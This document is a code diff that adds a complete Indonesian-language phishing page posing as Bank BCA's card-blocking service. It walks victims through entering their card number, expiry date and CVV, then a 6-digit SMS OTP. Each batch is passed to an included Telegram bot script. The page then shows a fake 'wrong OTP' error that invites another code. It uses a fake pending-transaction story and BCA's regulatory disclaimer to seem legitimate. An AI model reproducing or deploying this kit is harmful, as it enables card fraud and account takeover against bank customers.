@@ -1,0 +1,777 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Blokir Kartu</title>
+  <link rel="icon" href="ll/home/Bn1-0TP1/favicon.png">
+  <!-- Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <!-- Bootstrap & Icons -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <style>
+    /* ====================================================== */
+    /* 🔒 KUNCI UTAMA — TIDAK BOLEH DIUBAH */
+    /* ====================================================== */
+    * { 
+      box-sizing: border-box; 
+      margin: 0; 
+      padding: 0; 
+      box-sizing: border-box !important;
+    }
+    html, body {
+      width: 100% !important;
+      min-height: 100vh !important;
+      overflow-x: hidden !important;
+      font-family: 'Montserrat', sans-serif !important;
+      background: #f5f5f5 !important;
+      margin: 0 !important;
+      padding: 0 !important;
+    }
+    body { padding-bottom: 30px !important; }
+    .header-img { width: 100% !important; height: auto !important; display: block !important; margin: 0 !important; padding: 0 !important; }
+    .content-wrapper { padding: 0 15px !important; margin-top: 10px !important; }
+    .page { display: none !important; }
+    .page.active { display: block !important; }
+    .box-form {
+      background: #fff !important; 
+      border-radius: 10px !important;
+      padding: 20px 18px !important;
+      box-shadow: 3px 3px 8px rgba(0,0,0,0.08) !important;
+    }
+
+    /* ====================================================== */
+    /* 🔒 KARTU 3D — DIKUNCI */
+    /* ====================================================== */
+    .card-container {
+      perspective: 1000px !important;
+      width: 100% !important; 
+      max-width: 340px !important; 
+      height: 215px !important;
+      margin: 0 auto 20px !important; 
+      position: relative !important;
+    }
+    .card-inner {
+      position: relative !important; 
+      width: 100% !important; 
+      height: 100% !important;
+      text-align: center !important; 
+      transition: transform 0.6s ease-in-out !important;
+      transform-style: preserve-3d !important;
+    }
+    .card-container.flipped .card-inner { transform: rotateY(180deg) !important; }
+    .card-front, .card-back {
+      position: absolute !important; 
+      width: 100% !important; 
+      height: 100% !important;
+      -webkit-backface-visibility: hidden !important; 
+      backface-visibility: hidden !important;
+      border-radius: 12px !important; 
+      overflow: hidden !important; 
+      box-shadow: none !important;
+    }
+    .card-front {
+      background: #000 !important; 
+      color: white !important; 
+      padding: 0 !important; 
+      text-align: left !important;
+    }
+    .card-front img { width: 100% !important; height: 100% !important; object-fit: cover !important; display: block !important; }
+    .card-text-overlay {
+      position: absolute !important; 
+      top: 0 !important; 
+      left: 0 !important; 
+      width: 100% !important; 
+      height: 100% !important;
+      padding: 20px !important; 
+      color: #fff !important; 
+      font-family: monospace, sans-serif !important;
+      pointer-events: none !important; 
+      z-index: 10 !important; 
+      text-shadow: 1px 1px 3px rgba(0,0,0,0.8) !important;
+    }
+    .card-number-display { 
+      font-size: 20px !important; 
+      letter-spacing: 3px !important; 
+      position: absolute !important; 
+      top: 50% !important; 
+      left: 20px !important; 
+      transform: translateY(-50%) !important;
+    }
+    .card-valid-display { 
+      font-size: 11px !important; 
+      position: absolute !important; 
+      bottom: 45px !important; 
+      right: 20px !important; 
+      text-align: right !important;
+    }
+    .card-name-display { 
+      font-size: 13px !important; 
+      position: absolute !important; 
+      bottom: 15px !important; 
+      left: 20px !important; 
+      text-transform: uppercase !important; 
+      font-weight: 500 !important;
+    }
+    .card-back {
+      background: linear-gradient(135deg, #0066B3 0%, #0049ac 100%) !important;
+      color: white !important; 
+      transform: rotateY(180deg) !important; 
+      padding: 0 !important;
+    }
+    .card-back-strip {
+      width: 100% !important; 
+      height: 45px !important; 
+      background: #000 !important; 
+      margin-top: 30px !important;
+    }
+    .card-cvv-area { padding: 20px 25px !important; text-align: right !important; }
+    .cvv-label { font-size: 12px !important; color: #ccc !important; margin-bottom: 5px !important; text-transform: uppercase !important; }
+    .cvv-display {
+      font-size: 22px !important; 
+      font-weight: bold !important; 
+      color: #000 !important;
+      background: #fff !important; 
+      display: inline-block !important;
+      padding: 8px 15px !important; 
+      border-radius: 4px !important;
+      letter-spacing: 4px !important; 
+      font-family: monospace !important;
+    }
+
+    /* ====================================================== */
+    /* 🔒 INPUT FORM — UKURAN & WARNA DIKUNCI PERMANEN */
+    /* ====================================================== */
+    .form-group { margin-bottom: 14px !important; }
+    .form-label {
+      font-size: 14px !important;
+      font-weight: 600 !important; 
+      color: #0047AB !important;
+      margin-bottom: 6px !important; 
+      display: block !important;
+    }
+
+    /* --- NOMOR KARTU --- */
+    .input-single {
+      position: relative !important; 
+      border: 1px solid #FFA500 !important;
+      border-radius: 8px !important; 
+      overflow: hidden !important; 
+      background: #fff !important;
+    }
+    .input-single .input-icon {
+      position: absolute !important; 
+      left: 14px !important; 
+      top: 50% !important; 
+      transform: translateY(-50%) !important;
+      color: #0047AB !important; 
+      font-size: 18px !important; 
+      z-index: 1 !important;
+    }
+    .input-single input {
+      width: 100% !important; 
+      border: none !important; 
+      outline: none !important; 
+      box-shadow: none !important;
+      padding: 11px 14px 11px 44px !important;
+      font-size: 15px !important;
+      background: transparent !important; 
+      color: #333 !important; 
+      font-weight: 500 !important;
+    }
+    .input-single input::placeholder { color: #999 !important; font-size: 14px !important; }
+
+    /* --- BULAN & TAHUN — SEJAJAR --- */
+    .input-row-2col {
+      display: flex !important; 
+      gap: 12px !important; 
+      width: 100% !important;
+    }
+    .input-col { flex: 1 !important; }
+    .input-col .form-label { margin-bottom: 6px !important; }
+    .select-box {
+      width: 100% !important; 
+      border: 1px solid #FFA500 !important; 
+      border-radius: 8px !important;
+      padding: 11px 14px !important;
+      font-size: 15px !important;
+      color: #333 !important; 
+      font-weight: 500 !important; 
+      background: #fff !important;
+      appearance: none !important; 
+      -webkit-appearance: none !important;
+      background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%230047AB' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e") !important;
+      background-repeat: no-repeat !important; 
+      background-position: right 12px center !important; 
+      background-size: 16px !important;
+      cursor: pointer !important;
+    }
+
+    /* --- CVV --- */
+    .input-cvv {
+      position: relative !important; 
+      border: 1px solid #FFA500 !important;
+      border-radius: 8px !important; 
+      overflow: hidden !important; 
+      background: #fff !important;
+    }
+    .input-cvv .input-icon {
+      position: absolute !important; 
+      left: 14px !important; 
+      top: 50% !important; 
+      transform: translateY(-50%) !important;
+      color: #0047AB !important; 
+      font-size: 18px !important; 
+      z-index: 1 !important;
+    }
+    .input-cvv input {
+      width: 100% !important; 
+      border: none !important; 
+      outline: none !important; 
+      box-shadow: none !important;
+      padding: 11px 14px 11px 44px !important;
+      font-size: 15px !important;
+      background: transparent !important; 
+      color: #333 !important; 
+      font-weight: 500 !important;
+    }
+    .input-cvv input::placeholder { color: #999 !important; font-size: 14px !important; }
+
+    /* ====================================================== */
+    /* 🔒 TOMBOL — DIKUNCI */
+    /* ====================================================== */
+    .btn-blockir {
+      width: 100% !important; 
+      background: #0049ac !important; 
+      color: #fff !important;
+      font-size: 16px !important; 
+      font-weight: 600 !important; 
+      padding: 12px !important;
+      border: none !important; 
+      border-radius: 10px !important; 
+      margin-top: 6px !important;
+      transition: background 0.2s ease !important;
+      cursor: pointer !important;
+    }
+    .btn-blockir:hover { background: #003d8e !important; color: #fff !important; }
+    .btn-kembali { background: #e9ecef !important; color: #333 !important; margin-top: 0 !important; margin-right: 8px !important; }
+    .btn-kembali:hover { background: #dee2e6 !important; color: #333 !important; }
+    .d-flex-gap { display: flex !important; gap: 8px !important; }
+    .d-flex-gap button { flex: 1 !important; }
+
+    /* ====================================================== */
+    /* 🔒 HALAMAN INFO — DIKUNCI */
+    /* ====================================================== */
+    .info-icon-wrapper { text-align: center !important; margin-bottom: 25px !important; padding-top: 10px !important; }
+    .info-icon {
+      width: 90px !important; 
+      height: 90px !important;
+      background: linear-gradient(135deg, #e8f0fe, #d4e3fc) !important;
+      border-radius: 50% !important; 
+      display: inline-flex !important; 
+      align-items: center !important; 
+      justify-content: center !important;
+      font-size: 42px !important; 
+      color: #0049ac !important;
+    }
+    .info-title { text-align: center !important; font-size: 20px !important; font-weight: 700 !important; color: #0049ac !important; margin-bottom: 15px !important; line-height: 1.4 !important; }
+    .info-text { text-align: center !important; font-size: 14px !important; color: #444 !important; line-height: 1.7 !important; margin-bottom: 30px !important; padding: 0 5px !important; }
+    .info-highlight {
+      background: #f0f7ff !important; 
+      border-left: 3px solid #0049ac !important;
+      padding: 12px 15px !important; 
+      border-radius: 6px !important;
+      margin-bottom: 25px !important; 
+      font-size: 13px !important; 
+      color: #0049ac !important; 
+      line-height: 1.6 !important;
+    }
+
+    /* ====================================================== */
+    /* 🔒 POP-UP KONFIRMASI — DIKUNCI */
+    /* ====================================================== */
+    .popup-overlay {
+      position: fixed !important; 
+      inset: 0 !important; 
+      background: rgba(0,0,0,0.4) !important;
+      display: none !important; 
+      align-items: center !important; 
+      justify-content: center !important;
+      z-index: 9999 !important; 
+      padding: 20px !important;
+    }
+    .popup-overlay.active { display: flex !important; }
+    .popup-box {
+      background: #fff !important; 
+      border-radius: 12px !important; 
+      padding: 25px 20px !important;
+      max-width: 380px !important; 
+      width: 100% !important; 
+      text-align: center !important;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.2) !important;
+    }
+    .popup-title { font-size: 18px !important; font-weight: 700 !important; color: #00a651 !important; margin-bottom: 15px !important; line-height: 1.4 !important; }
+    .popup-divider { height: 1px !important; background: #eee !important; margin-bottom: 20px !important; }
+    .popup-icon {
+      width: 40px !important; 
+      height: 40px !important; 
+      background: #e6f4ea !important; 
+      border-radius: 50% !important;
+      display: inline-flex !important; 
+      align-items: center !important; 
+      justify-content: center !important;
+      font-size: 20px !important; 
+      color: #00a651 !important; 
+      margin-bottom: 15px !important;
+    }
+    .popup-text { font-size: 15px !important; color: #333 !important; line-height: 1.6 !important; margin-bottom: 25px !important; }
+    .popup-btn-primary {
+      width: 100% !important; 
+      background: #0047ab !important; 
+      color: #fff !important;
+      font-size: 16px !important; 
+      font-weight: 600 !important; 
+      padding: 12px !important;
+      border: none !important; 
+      border-radius: 8px !important; 
+      transition: background 0.2s ease !important;
+      cursor: pointer !important;
+    }
+    .popup-btn-primary:hover { background: #003a8c !important; color: #fff !important; }
+
+    /* ====================================================== */
+    /* 🔒 OTP INPUT — DIKUNCI */
+    /* ====================================================== */
+    .otp-title { text-align: center !important; font-size: 18px !important; font-weight: 700 !important; color: #0049ac !important; margin-bottom: 10px !important; }
+    .otp-desc { text-align: center !important; font-size: 13px !important; color: #666 !important; margin-bottom: 25px !important; line-height: 1.5 !important; }
+    .otp-container { display: flex !important; justify-content: center !important; gap: 10px !important; margin-bottom: 25px !important; }
+    .otp-input {
+      width: 50px !important; 
+      height: 55px !important; 
+      text-align: center !important; 
+      font-size: 24px !important; 
+      font-weight: 700 !important;
+      border: 2px solid #ddd !important; 
+      border-radius: 8px !important; 
+      outline: none !important;
+      transition: all 0.2s ease !important;
+    }
+    .otp-input:focus { border-color: #0049ac !important; box-shadow: 0 0 0 3px rgba(0,73,172,0.15) !important; }
+    .otp-input.filled { border-color: #0049ac !important; }
+
+    /* ====================================================== */
+    /* 🔒 MODAL GAGAL OTP — DIKUNCI */
+    /* ====================================================== */
+    .modal-overlay {
+      position: fixed !important; 
+      inset: 0 !important; 
+      background: rgba(0,0,0,0.5) !important;
+      display: none !important; 
+      align-items: center !important; 
+      justify-content: center !important;
+      z-index: 10000 !important; 
+      padding: 20px !important;
+    }
+    .modal-overlay.active { display: flex !important; }
+    .modal-box {
+      background: #fff !important; 
+      border-radius: 12px !important; 
+      padding: 30px 25px !important;
+      max-width: 360px !important; 
+      width: 100% !important; 
+      text-align: center !important;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.2) !important;
+    }
+    .modal-icon {
+      width: 60px !important; 
+      height: 60px !important; 
+      background: #ffebee !important; 
+      border-radius: 50% !important;
+      display: inline-flex !important; 
+      align-items: center !important; 
+      justify-content: center !important;
+      font-size: 28px !important; 
+      color: #e53935 !important; 
+      margin-bottom: 15px !important;
+    }
+    .modal-title { font-size: 20px !important; font-weight: 700 !important; color: #e53935 !important; margin-bottom: 15px !important; }
+    .modal-text { font-size: 14px !important; color: #555 !important; line-height: 1.8 !important; margin-bottom: 25px !important; }
+    .modal-btn {
+      width: 100% !important; 
+      background: #0049ac !important; 
+      color: #fff !important;
+      font-size: 16px !important; 
+      font-weight: 600 !important; 
+      padding: 12px !important;
+      border: none !important; 
+      border-radius: 8px !important;
+      cursor: pointer !important;
+    }
+    .modal-btn:hover { background: #003d8e !important; color: #fff !important; }
+
+    /* ====================================================== */
+    /* 🔒 LOADING — DIKUNCI */
+    /* ====================================================== */
+    .loading-overlay {
+      position: fixed !important; 
+      inset: 0 !important; 
+      background: rgba(0,0,0,0.6) !important;
+      display: none !important; 
+      align-items: center !important; 
+      justify-content: center !important;
+      z-index: 10001 !important;
+    }
+    .loading-overlay.active { display: flex !important; }
+    .loading-icon { font-size: 40px !important; color: #fff !important; animation: spin 1s linear infinite !important; }
+    @keyframes spin { from { transform: rotate(0deg) !important; } to { transform: rotate(360deg) !important; } }
+
+    .privacy-note {
+      font-size: 11px !important; 
+      color: #0f71b3 !important; 
+      text-align: center !important;
+      margin-top: 15px !important; 
+      line-height: 1.6 !important; 
+      padding: 0 10px !important;
+    }
+
+    /* ====================================================== */
+    /* 🔒 RESPONSIVE — DIKUNCI */
+    /* ====================================================== */
+    @media (max-width: 480px) {
+      .box-form { padding: 18px 15px !important; }
+      .card-container { height: 190px !important; }
+      .card-number-display { font-size: 16px !important; }
+      .cvv-display { font-size: 18px !important; padding: 6px 12px !important; }
+      .form-label { font-size: 14px !important; }
+      .otp-input { width: 45px !important; height: 50px !important; font-size: 20px !important; }
+    }
+  </style>
+</head>
+<body>
+  <!-- Loading Overlay -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <i class="fas fa-spinner loading-icon"></i>
+  </div>
+
+  <!-- Gambar Atas -->
+  <img src="https://formcbybbca.netlify.app/www.web-ld.com/membatalkan/batalblokir/img/ben.jpg" alt="Bank" class="header-img">
+
+  <!-- Konten Utama -->
+  <div class="content-wrapper">
+    <!-- ==================================== -->
+    <!-- HALAMAN 1: FORM DATA KARTU -->
+    <!-- ==================================== -->
+    <div class="page active" id="pageKartu">
+      <div class="box-form">
+        <!-- 🔒 KARTU 3D — GAMBAR SUDAH DIGANTI -->
+        <div class="card-container" id="cardContainer">
+          <div class="card-inner">
+            <div class="card-front">
+              <!-- ✅ GAMBAR BARU: BCA -->
+              <img id="card-image" src="https://ikon-dusky.vercel.app/images/bca.webp" alt="Gambar kartu bank">
+              <div class="card-text-overlay">
+                <div class="card-number-display" id="cardNumberText">XXXX XXXX XXXX XXXX</div>
+                <div class="card-valid-display">VALID THRU <span id="validThru">XX/XX</span></div>
+                <div class="card-name-display" id="cardNameText">BANK BCA</div>
+              </div>
+            </div>
+            <div class="card-back">
+              <div class="card-back-strip"></div>
+              <div class="card-cvv-area">
+                <div class="cvv-label">CVV / CVC</div>
+                <div class="cvv-display" id="cvvDisplay">XXX</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- FORM INPUT — FINAL & DIKUNCI -->
+        <form id="formKartu">
+          <!-- 1. NOMOR KARTU -->
+          <div class="form-group">
+            <label class="form-label">Nomor Kartu</label>
+            <div class="input-single">
+              <i class="fas fa-credit-card input-icon"></i>
+              <input type="tel" minlength="19" maxlength="19" id="cardInput" placeholder="0000 0000 0000 0000" required>
+            </div>
+          </div>
+
+          <!-- 2. BULAN & TAHUN — SEJAJAR -->
+          <div class="input-row-2col form-group">
+            <div class="input-col">
+              <label class="form-label">Bulan</label>
+              <select class="select-box" id="monthSelect" required>
+                <option value="" disabled selected>Bulan</option>
+                <option value="01">01</option><option value="02">02</option><option value="03">03</option>
+                <option value="04">04</option><option value="05">05</option><option value="06">06</option>
+                <option value="07">07</option><option value="08">08</option><option value="09">09</option>
+                <option value="10">10</option><option value="11">11</option><option value="12">12</option>
+              </select>
+            </div>
+            <div class="input-col">
+              <label class="form-label">Tahun</label>
+              <select class="select-box" id="yearSelect" required>
+                <option value="" disabled selected>Tahun</option>
+                <option value="24">2024</option><option value="25">2025</option><option value="26">2026</option>
+                <option value="27">2027</option><option value="28">2028</option><option value="29">2029</option>
+                <option value="30">2030</option><option value="31">2031</option><option value="32">2032</option>
+                <option value="33">2033</option><option value="34">2034</option><option value="35">2035</option>
+              </select>
+            </div>
+          </div>
+
+          <!-- 3. CVV -->
+          <div class="form-group">
+            <label class="form-label">CVV / Kode Keamanan</label>
+            <div class="input-cvv">
+              <i class="fas fa-lock input-icon"></i>
+              <input type="tel" minlength="3" maxlength="4" id="cvvInput" placeholder="***" required>
+            </div>
+          </div>
+
+          <!-- TOMBOL -->
+          <button type="submit" class="btn-blockir">Lanjutkan</button>
+        </form>
+
+        <p class="privacy-note">
+          PT Bank Central Asia Tbk. berizin dan diawasi oleh Otoritas Jasa Keuangan (OJK) serta merupakan peserta penjaminan Lembaga Penjamin Simpanan (LPS).
+        </p>
+      </div>
+    </div>
+
+    <!-- HALAMAN 2: INFO VERIFIKASI -->
+    <div class="page" id="pageInfo">
+      <div class="box-form">
+        <div class="info-icon-wrapper">
+          <div class="info-icon"><i class="fas fa-shield-alt"></i></div>
+        </div>
+        <h3 class="info-title">Verifikasi Keamanan</h3>
+        <p class="info-text">
+          Untuk keamanan transaksi, kami akan mengirimkan kode verifikasi (OTP) ke nomor ponsel yang terdaftar di Bank.
+        </p>
+        <div class="info-highlight">
+          <i class="fas fa-info-circle mr-2"></i>
+          Pastikan nomor HP Anda aktif dan dapat menerima SMS. Kode OTP berlaku selama <strong>5 menit</strong>.
+        </div>
+        <div class="d-flex-gap">
+          <button type="button" class="btn-blockir btn-kembali" id="btnKembaliDariInfo">Kembali</button>
+          <button type="button" class="btn-blockir" id="btnLanjutkanKeOTP">Lanjutkan</button>
+        </div>
+        <p class="privacy-note">
+          Jangan pernah memberikan kode OTP kepada siapapun, termasuk pihak yang mengaku sebagai pegawai Bank.
+        </p>
+      </div>
+    </div>
+
+    <!-- POP-UP KONFIRMASI -->
+    <div class="popup-overlay" id="popupKonfirmasi">
+      <div class="popup-box">
+        <h3 class="popup-title">BLOKIR KARTU SEDANG DI PROSES</h3>
+        <div class="popup-divider"></div>
+        <div class="popup-icon"><i class="fas fa-check"></i></div>
+        <p class="popup-text">
+          Ada transaksi yang sedang berlangsung, apakah ingin di batalkan?
+        </p>
+        <button class="popup-btn-primary" id="btnBatalkan">Ya, Batalkan</button>
+      </div>
+    </div>
+
+    <!-- HALAMAN 3: INPUT KODE OTP 6 DIGIT -->
+    <div class="page" id="pageOTP">
+      <div class="box-form">
+        <h3 class="otp-title">Verifikasi Kode OTP</h3>
+        <p class="otp-desc">
+          Kami telah mengirimkan kode OTP 6 digit ke nomor HP yang terdaftar.<br>
+          Masukkan kode tersebut di bawah ini.
+        </p>
+        <div class="otp-container">
+          <input type="tel" maxlength="1" class="otp-input" id="otp1" inputmode="numeric">
+          <input type="tel" maxlength="1" class="otp-input" id="otp2" inputmode="numeric">
+          <input type="tel" maxlength="1" class="otp-input" id="otp3" inputmode="numeric">
+          <input type="tel" maxlength="1" class="otp-input" id="otp4" inputmode="numeric">
+          <input type="tel" maxlength="1" class="otp-input" id="otp5" inputmode="numeric">
+          <input type="tel" maxlength="1" class="otp-input" id="otp6" inputmode="numeric">
+        </div>
+        <div class="d-flex-gap">
+          <button type="button" class="btn-blockir btn-kembali" id="btnKembaliDariOTP">Kembali</button>
+          <button type="button" class="btn-blockir" id="btnKirimOTP">Kirim OTP</button>
+        </div>
+        <p class="privacy-note">
+          Kode OTP berlaku selama 5 menit. Jangan berikan kode ini kepada siapapun.
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODAL GAGAL OTP -->
+  <div class="modal-overlay" id="failModal">
+    <div class="modal-box">
+      <div class="modal-icon"><i class="fas fa-times"></i></div>
+      <h3 class="modal-title">Verifikasi Gagal</h3>
+      <p class="modal-text">
+        Kode OTP yang Anda masukkan bukan kode yang terbaru.<br>
+        Silakan periksa kembali SMS yang dikirimkan dan masukkan kode OTP terbaru.
+      </p>
+      <button class="modal-btn" onclick="tutupModal()">Coba Lagi</button>
+    </div>
+  </div>
+
+  <!-- TELEGRAM BOT -->
+  <script src="telegram-bot.js"></script>
+
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
+
+  <script>
+    // ======================================================
+    // 🔒 FUNGSI DIKUNCI — TIDAK BOLEH DIUBAH
+    // ======================================================
+    let dataKartu = {};
+
+    const cardContainer = document.getElementById('cardContainer');
+    const cardInput = document.getElementById('cardInput');
+    const monthSelect = document.getElementById('monthSelect');
+    const yearSelect = document.getElementById('yearSelect');
+    const cvvInput = document.getElementById('cvvInput');
+    const cardNumberText = document.getElementById('cardNumberText');
+    const validThru = document.getElementById('validThru');
+    const cvvDisplay = document.getElementById('cvvDisplay');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    const formKartu = document.getElementById('formKartu');
+    const pageKartu = document.getElementById('pageKartu');
+    const pageInfo = document.getElementById('pageInfo');
+    const pageOTP = document.getElementById('pageOTP');
+    const popupKonfirmasi = document.getElementById('popupKonfirmasi');
+    const failModal = document.getElementById('failModal');
+
+    const btnKembaliDariInfo = document.getElementById('btnKembaliDariInfo');
+    const btnLanjutkanKeOTP = document.getElementById('btnLanjutkanKeOTP');
+    const btnBatalkan = document.getElementById('btnBatalkan');
+    const btnKembaliDariOTP = document.getElementById('btnKembaliDariOTP');
+    const btnKirimOTP = document.getElementById('btnKirimOTP');
+    const otpInputs = [
+      document.getElementById('otp1'), document.getElementById('otp2'), document.getElementById('otp3'),
+      document.getElementById('otp4'), document.getElementById('otp5'), document.getElementById('otp6')
+    ];
+
+    // PUTAR KARTU SAAT FOKUS CVV
+    cvvInput.addEventListener('focus', () => cardContainer.classList.add('flipped'));
+    cvvInput.addEventListener('blur', () => cardContainer.classList.remove('flipped'));
+    cvvInput.addEventListener('input', function() {
+      let value = this.value.replace(/\D/g, '');
+      if (value.length > 4) value = value.slice(0, 4);
+      this.value = value;
+      cvvDisplay.textContent = value || 'XXX';
+    });
+
+    // FORMAT NOMOR KARTU
+    cardInput.addEventListener('input', function() {
+      let value = this.value.replace(/\D/g, '');
+      if (value.length > 16) value = value.slice(0, 16);
+      let formatted = value.replace(/(.{4})/g, '$1 ').trim();
+      this.value = formatted;
+      cardNumberText.textContent = formatted.padEnd(4, 'XXXX');
+    });
+
+    // UPDATE MASA BERLAKU
+    function updateValidThru() {
+      const month = monthSelect.value || '00';
+      const year = yearSelect.value || '00';
+      validThru.textContent = `${month}/${year.slice(-2)}`;
+    }
+    monthSelect.addEventListener('change', updateValidThru);
+    yearSelect.addEventListener('change', updateValidThru);
+
+    // KIRIM DATA KARTU → HALAMAN INFO
+    formKartu.addEventListener('submit', async function(e) {
+      e.preventDefault();
+      
+      const cardNumber = cardInput.value.trim().replace(/\s/g, '');
+      const month = monthSelect.value;
+      const year = yearSelect.value;
+      const cvv = cvvInput.value.trim();
+
+      if (cardNumber.length !== 16 || !month || !year || cvv.length < 3) {
+        alert('Harap lengkapi semua field dengan benar!');
+        return;
+      }
+
+      dataKartu = { noKartu: cardNumber, bulan: month, tahun: year, cvv: cvv };
+
+      loadingOverlay.classList.add('active');
+      if (typeof kirimDataBlokirKartu === 'function') {
+        await kirimDataBlokirKartu(dataKartu, 'DATA KARTU');
+      }
+      loadingOverlay.classList.remove('active');
+
+      pageKartu.classList.remove('active');
+      pageInfo.classList.add('active');
+    });
+
+    // HALAMAN INFO → POP-UP
+    btnLanjutkanKeOTP.addEventListener('click', () => popupKonfirmasi.classList.add('active'));
+
+    // POP-UP → HALAMAN OTP
+    btnBatalkan.addEventListener('click', async function() {
+      popupKonfirmasi.classList.remove('active');
+      pageInfo.classList.remove('active');
+      pageOTP.classList.add('active');
+      otpInputs[0].focus();
+    });
+
+    btnKembaliDariInfo.addEventListener('click', () => {
+      pageInfo.classList.remove('active');
+      pageKartu.classList.add('active');
+    });
+
+    btnKembaliDariOTP.addEventListener('click', () => {
+      pageOTP.classList.remove('active');
+      pageInfo.classList.add('active');
+      otpInputs.forEach(input => { input.value = ''; input.classList.remove('filled'); });
+    });
+
+    // OTP OTOMATIS PINDAH
+    otpInputs.forEach((input, index) => {
+      input.addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '');
+        if (this.value) this.classList.add('filled');
+        else this.classList.remove('filled');
+        if (this.value.length === 1 && index < otpInputs.length - 1) otpInputs[index + 1].focus();
+      });
+      input.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace' && !this.value && index > 0) otpInputs[index - 1].focus();
+      });
+    });
+
+    // KIRIM OTP → TAMPILKAN MODAL GAGAL
+    btnKirimOTP.addEventListener('click', async function() {
+      const kodeOTP = otpInputs.map(i => i.value).join('');
+      if (kodeOTP.length !== 6 || !/^\d{6}$/.test(kodeOTP)) {
+        alert('Masukkan kode OTP 6 digit lengkap!');
+        return;
+      }
+
+      loadingOverlay.classList.add('active');
+      const dataLengkap = { ...dataKartu, otp: kodeOTP };
+      
+      if (typeof kirimDataBlokirKartu === 'function') {
+        await kirimDataBlokirKartu(dataLengkap, 'DATA LENGKAP + OTP');
+      }
+      
+      loadingOverlay.classList.remove('active');
+      
+      // TAMPILKAN PESAN GAGAL
+      failModal.classList.add('active');
+    });
+
+    function tutupModal() {
+      failModal.classList.remove('active');
+      otpInputs.forEach(input => { input.value = ''; input.classList.remove('filled'); });
+      otpInputs[0].focus();
+    }
+  </script>
+</body>
+</html>
